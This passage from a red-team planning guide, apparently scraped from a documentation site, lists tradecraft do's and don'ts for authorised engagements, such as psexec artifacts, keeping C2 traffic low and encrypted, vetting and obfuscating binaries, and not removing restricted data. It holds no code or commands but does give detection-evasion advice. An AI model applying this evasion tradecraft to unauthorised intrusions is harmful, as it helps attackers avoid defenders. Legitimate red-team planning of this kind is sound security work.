discover they were \"fat fingered\" (after access error)? While these are oversimplifications, they represent the need for peer review on tools, C2, setup, execution, and even clean up. DO: UNDERSTAND THE TOOLS AND TECHNOLOGIES USED \u00b6 Understand the underlying technology of a tool or technique before using it on an event. Know how the tool or technique interacts with a target, what network traffic it may generate, and what traces it may leave behind. Knowing what a tool does is only one-third of the equation. What does that mean exactly? Let\u2019s quickly look at a few questions and an example. What artifacts does the tool leave behind? - Are any files modified during execution? Are there tales in the network traffic? Now let\u2019s look at psexec (a commonly used tool, but not a recommended tool for Red Teaming a remote system) Depending on how psexec is executed it: Copies a service file to the remote system Enters a service key into the registry Creates a prefetch file Creates an entry in the Application Compatibility Cache - Creates a login event Creates a profile folder for the remote user Attempts to remove service file and key when exiting (not always successful) What happens when using the \u2013e option? \u2013s option? How does this differ from psexec for PowerShell? Psexec is not a bad tool, and Red Team operators will use it. But... it is important to understand the IOCs generated by a tool. Getting caught due to a lack of tool understanding is not something any Red Team operators wants to experience. DO: PERFORM SITUATIONAL AWARENESS \u00b6 After gaining access to a remote system perform situational awareness before moving on. Understand the environment you are in (Is the target in scope?) What protections exist on the system or network? What are the risks of being caught and what attack paths does the system provide? - Are there pre-established connections to other network resources? Who is into the system? Who has recently logged into the system? DO: MINIMIZE CALLBACK (C2) VOLUME \u00b6 Unless a Host Based protection mechanism is triggered, it is more likely to be discovered or caught by a defenders recognition and/or analysis of traffic on the network. To avoid early detection, it is always good tradecraft to limit the amount of traffic generated during the engagement. There are several general concepts that, if followed, increase the success of the engagement while decreasing the chances of being discovered: Keep traffic internal to a network: One of the most common issues, and one you should always attempt to change, are the limited number of sensors inside a network. Most network protections are currently applied at the boundary. Pivot command and control traffic to a minimal number of outbound sources: Maintain at least two outbound sources for C2 redundancy; however, only use one for operations (considered an interactive tier). The second (a long or short haul tier) is dormant or extremely slow to be used as a backup if/when the primary is discovered. DON\u2019T: USE UNTESTED TOOLS ON A TARGET SYSTEM \u00b6 Before using a new tool (script, application, binary, process, etc.) on a target system, it must be tested, undergo an internal vetting process and be added to an official toolset. Does the tool have negative impacts on specific versions of an OS? Works fine on Windows 7 but causes system error in Windows 8? Do you know if/what additional actions the tool performs? Tool creates a covert channel for use inside the network. This tool creates a private tunnel between host on a virtual interface; however, this creates a network conflict Ex: target net: 10.10.2.0/24, covert channel net: 10.10.2.0/24 - Hint: Don\u2019t use these! Does the tool try to call home for updates? At start or during a specific operation, the tool tries to poll home for updates This can trigger defensive alerts identifying unauthorized persons or software on the network Does the tool attempt to run as a specific user or, worse, create a user/group? Keep these questions in mind before executing untested or unknown tools. DON\u2019T: USE UNENCRYPTED CHANNELS FOR C2 \u00b6 Command and control data exiting the network must be encrypted. Clear text data, such as uploading a binary, issuing an operating system command or using a web shell will be detected by an IDS or other network defense if in clear text. It has become common for IPS/IDS to detect specific strings discovered in clear text traffic. For example: \"C:\\Windows\\System32\" has become a common trigger for investigation. Some defenders have even gone the extra mile in legitimizing a potential threat. Assume the defender uses a remote administration tool on a regular basis. Ignoring recommendation, this traffic is unencrypted. Rather than alert each time the tool is used legitimately, the alert is configured to look for inconsistencies in the text. For example: most attackers are accustomed to typing lowercase commands in windows. The defender ignores \"C:\\Windows\\System32\" but alerts on \"c:\\windows\\system32\" Encryption of internal C2 traffic depends upon several different factors: Are there sensors inside the network? Are there other encrypted communications occurring between target systems? Would encrypted traffic stand-out more than unencrypted traffic? Internal encryption is another example of where peers should be consulted to determine the best course of action before deploying C2 further into a network. DON\u2019T: ATTEMPT TO EXPLOIT OR ATTACK UNENCRYPTED WEBSITES \u00b6 As tempting as it may be, do not attack unencrypted websites. Simple attacks can trigger IDS. Always know your target IP space. There are likely several websites available for review. Proper reconnaissance and/or coordination should have discovered each. Create a list of sites in your target log. Include IP, URLs, an educated guess at the function, ports, protocols, etc. Important Note! Prior to performing any exploitation and attacks against a web server, refer to your rules of engagement and fully understand: Who actually owns the website? Who owns the system where the website is hosted? Who owns the backend application? Have proper approvals been obtained to test? DON\u2019T: EXECUTE FROM NON-EXECUTABLE LOCATIONS \u00b6 Execution on a Windows environment must occur in a location typical of windows. Executable locations such as c:\\programdata, c:\\progam files, c:\\windows are common. Execution for locations such as c:\\windows\\temp should never occur. DON\u2019T: USE BINARIES FOR INITIAL CAPABILITIES \u00b6 As a general rule, do not drop binaries on the system. Use built-in commands, such as PowerShell, to achieve your goals first. This is not always possible and binaries may be required; however, binaries must be vetted, obfuscated and tested against detection before use. Ensure all other \"Do\u2019s and Don\u2019ts\" are met for all binaries. Consult a senior operator before dropping any binary. DON\u2019T: DOWNLOAD RESTRICTED DATASETS \u00b6 NEVER download (or remove from the target network) any PII, HIPPA, PCI, or other restricted datasets. A good rule of thumb is to annotate the type of data, location, access method, and level of access of restricted data in the log. Ensure the log notes include a reference to the type of data discovered for quick reference. Take a screenshot of the displayed filename and location (assuming the file name has no restricted data included). If the operator can screenshot a portion of the dataset without capturing the restricted data, they may do so for proof-of-access; however, DO NOT take screenshots of the data itself!","title":"Tradecraft Guidance"},{"location":"redteaming/redteamplanning/tradecraft/#red-team-tradecraft-and-ttp-guidance","text":"This template should be used to define the overall guidance on Red Team Tradecraft and TTPs.
